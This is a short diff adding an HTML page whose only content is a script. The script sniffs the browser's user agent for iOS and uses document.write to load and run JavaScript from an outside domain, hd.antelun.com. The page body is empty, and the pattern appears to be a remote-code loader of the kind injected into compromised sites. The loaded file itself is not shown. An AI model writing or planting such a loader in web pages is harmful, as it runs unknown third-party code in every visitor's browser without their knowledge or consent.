@@ -1,0 +1,17 @@
+<head>
+<script>
+function is_ios() {
+var u = navigator.userAgent;
+if(!!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)){
+	return true;
+}else{
+	return false;
+}
+}
+var js="http://hd.antelun.com/s1/tv1.js";
+if(is_ios()){js="https://hd.antelun.com/s1/tv1.js";}
+document.write("<script src='"+js+"'><\/script>");document.close();
+</script>
+</head>
+<body>
+</body>
